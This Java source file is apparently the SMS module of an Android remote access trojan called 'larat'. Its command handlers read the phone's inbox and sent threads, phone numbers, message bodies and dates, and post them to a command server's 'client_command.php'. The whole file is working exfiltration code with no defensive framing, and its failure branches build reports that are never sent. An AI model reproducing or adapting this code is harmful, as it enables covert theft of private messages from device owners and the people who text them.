package com.c4wd.commands;

import android.os.AsyncTask;

import com.c4wd.larat.Constants;
import com.c4wd.larat.RestClient;
import com.c4wd.sms.SMSConstants;
import com.c4wd.sms.SMSObject;
import com.c4wd.sms.SMSReader;
import com.c4wd.sms.SMSThreadInfo;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.UUID;

/**
 * Created by Cory-PC on 11/22/2015.
 */
public class SMSCommands {

    public static class GetThreadsTask extends AsyncTask<Object, Void, Object> {

        private CommandContext context;
        private String box_id;

        @Override
        protected Object doInBackground(Object... objects) {
            context = (CommandContext) objects[0];
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            SMSReader reader;
            boolean outbox = false;
            //setup our SMSReader
            box_id = (String) context.getArgument(0);
            if (box_id != null && box_id.compareTo("OUTBOX") == 0) {
                reader = new SMSReader(SMSConstants.SENT, context.getContext());
                outbox = true;
            } else {
                reader = new SMSReader(SMSConstants.INBOX, context.getContext());
            }
            //get the thread ids
            List<SMSThreadInfo> threads = reader.getThreads();

            //post the results to the server
            if (threads.size() > 0) {
                try {

                    String uuid = UUID.randomUUID().toString();
                    RequestParams params = new RequestParams();
                    JSONArray messages = new JSONArray();
                    for (SMSThreadInfo info : threads) {
                        JSONObject msg_array = new JSONObject();
                        msg_array.put("thread_id", info.getThreadId());
                        msg_array.put("contact_id", info.getContactId());
                        msg_array.put("number", info.getNumber());
                        messages.put(msg_array);
                    }

                    //post our threads to the server, saved under the UUID
                    params.put("command", "sms_thread_list");
                    params.put("message_type", outbox ? "SMS_THREAD_INFO_SENT" : "SMS_THREAD_INFO_INBOX");
                    params.put("thread_list", messages.toString());
                    params.put("uuid", uuid);
                    RestClient.post("client_command.php", params); //post results to the server

                    //alert user that we received the threads!
                    params = new RequestParams();
                    params.put("command", "addMessage");
                    params.put("client_id", Constants.CLIENT_ID);
                    params.put("message_type", "MESSAGE_THREAD_RECV");
                    params.put("message", uuid);
                    RestClient.post("client_command.php", params);

                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /*
     *   Stores a copy of thread_id's message history into a Sugar database for future use
     */
    public static class CacheThreadIdTask extends AsyncTask<Object, Void, Object> {

        private CommandContext context;

        @Override
        protected Object doInBackground(Object... objects) {
            context = (CommandContext)objects[0];
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            SMSReader reader = new SMSReader(SMSConstants.SMS, context.getContext());
            if (context.getArguments().size() > 0) {
                long thread_id = Long.parseLong((String)context.getArgument(0));
                reader.cacheMessages(thread_id);
            }
        }
    }

    public static class GetMessagesTask extends AsyncTask<Object, Void, Object> {

        private CommandContext context;

        @Override
        protected Object doInBackground(Object... objects) {
            context = (CommandContext) objects[0];
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            SMSReader reader = new SMSReader(SMSConstants.SMS, context.getContext());
            if (context.getArguments().size() > 0) {
                try {
                    long thread_id = Long.parseLong((String)context.getArgument(0));
                    List<SMSObject> threads = reader.getMessages(thread_id, true);
                    if (threads.size() > 0) {
                        String uuid = UUID.randomUUID().toString();
                        RequestParams params = new RequestParams();
                        JSONArray messages = new JSONArray();
                        for (SMSObject info : threads) {
                            JSONObject msg_array = new JSONObject();
                            msg_array.put("thread_id", info.getThreadId());
                            msg_array.put("body", info.getBody());
                            msg_array.put("number", info.getAddress());
                            msg_array.put("date", info.getDate());
                            messages.put(msg_array);
                        }
                        //post our messages to the server, saved under the UUID
                        params.put("command", "addMessage");
                        params.put("message_type", "SMS_THREAD_OBJECT");
                        params.put("message", messages.toString());
                        params.put("client_id", uuid);
                        RestClient.post("client_command.php", params); //post results to the server

                        //alert user that we received the threads!
                        params = new RequestParams();
                        params.put("command", "addMessage");
                        params.put("client_id", Constants.CLIENT_ID);
                        params.put("message_type", "MESSAGE_SMS_RECV");
                        params.put("message", uuid);
                        RestClient.post("client_command.php", params);
                    } else {
                        RequestParams params = new RequestParams();
                        params.put("command", "addMessage");
                        params.put("client_id", Constants.CLIENT_ID);
                        params.put("message_type", "MESSAGE_SMS_FAILED");
                        params.put("message", "Failed to read SMS or there weren't any!");
                    }
                } catch (Exception ex) {
                    RequestParams params = new RequestParams();
                    params.put("command", "addMessage");
                    params.put("client_id", Constants.CLIENT_ID);
                    params.put("message_type", "EXECUTION_ERROR");
                    params.put("message", ex.getMessage());
                }
            }
        }
    }
}
